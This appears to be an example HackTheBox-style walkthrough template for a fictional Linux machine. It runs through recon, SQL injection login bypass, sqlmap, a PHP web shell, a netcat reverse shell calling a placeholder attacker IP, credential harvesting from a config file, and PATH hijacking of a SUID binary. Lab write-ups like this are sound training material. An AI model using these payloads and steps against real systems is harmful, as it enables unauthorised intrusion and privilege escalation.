# Example Machine - HTB Walkthrough

> **Note:** This is an example walkthrough to demonstrate the system. Replace this content with your own walkthroughs.

## 📋 Information

- **Machine:** Example Machine
- **Platform:** HackTheBox
- **OS:** Linux
- **Difficulty:** Medium
- **Solved Date:** January 2025

---

## 🎯 Summary

This machine is an excellent exercise for practicing web exploitation, Linux enumeration, and privilege escalation via SUID files.

**Required Skills:**
- Basic web enumeration
- SQL Injection
- Linux enumeration
- Vulnerability research

**Skills Learned:**
- Advanced SQLi exploitation
- Privilege escalation via SUID
- Source code analysis

---

## 🔍 Reconnaissance

### Nmap Scan

```bash
nmap -sC -sV -oN nmap/initial 10.10.10.100
```

**Results:**
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu
80/tcp open  http    Apache httpd 2.4.41
```

### Web Enumeration

Visiting the website, we discover a management application with several features.

```bash
gobuster dir -u http://10.10.10.100 -w /usr/share/wordlists/dirb/common.txt
```

**Important Discoveries:**
- `/admin` - Admin panel (login required)
- `/upload` - File upload feature
- `/api` - API endpoint

---

## 🚪 Initial Foothold

### SQL Injection Vulnerability

The login form is vulnerable to SQL injection.

**Basic Test:**
```http
POST /login HTTP/1.1
Host: 10.10.10.100

username=admin' OR 1=1--&password=anything
```

### Exploitation with SQLMap

```bash
sqlmap -u "http://10.10.10.100/login" \
  --data="username=admin&password=test" \
  --dbs
```

We found a `webapp` database containing credentials.

### Initial Shell

After obtaining the credentials, we can upload a PHP reverse shell:

```php
<?php system($_GET['cmd']); ?>
```

```bash
# On our machine
nc -lvnp 4444

# Via the browser
http://10.10.10.100/uploads/shell.php?cmd=nc -e /bin/bash YOUR_IP 4444
```

Shell obtained as `www-data`.

---

## 👤 User Flag

### Local Enumeration

```bash
# List users
cat /etc/passwd | grep -v nologin

# Search for interesting files
find /var/www -type f -name "*.conf" 2>/dev/null
```

We find credentials in `/var/www/html/config.php`:

```php
$db_user = "developer";
$db_pass = "P@ssw0rd123!";
```

### User Escalation

These credentials work via SSH:

```bash
ssh developer@10.10.10.100
```

**User Flag:**
```bash
cat /home/developer/user.txt
```

---

## 🔐 Root Flag

### Privilege Enumeration

```bash
# Check SUID binaries
find / -perm -4000 2>/dev/null
```

We find a custom binary `/opt/backup` that is SUID root.

### Binary Analysis

```bash
strings /opt/backup
```

The binary calls `tar` without an absolute path!

### Privilege Escalation

We can exploit PATH hijacking:

```bash
cd /tmp
echo "/bin/bash" > tar
chmod +x tar
export PATH=/tmp:$PATH
/opt/backup
```

### Root Access

```bash
whoami
# root

cat /root/root.txt
```

---

## 🎓 Lessons Learned

### What I Learned

1. **SQL Injection:** How to identify and exploit SQLi in a login form
2. **Path Hijacking:** Privilege escalation technique via PATH manipulation
3. **Enumeration:** The importance of thorough enumeration of configuration files

### Key Takeaways

- ⚠️ Always test inputs for SQL injections
- 💡 Check configuration files for credentials
- 🔑 Custom SUID binaries are often vulnerable

---

## 🛠️ Tools Used

- **Nmap** - Port scanning
- **Gobuster** - Directory enumeration
- **SQLMap** - SQL Injection automation
- **Burp Suite** - HTTP request analysis
- **Netcat** - Reverse shell

---

## ⚠️ Disclaimer

This walkthrough is for educational purposes only. Use these techniques only on machines you have permission to access (like HackTheBox, TryHackMe, etc.).

---

**Written:** January 2025  
**Author:** Samuel Tesson
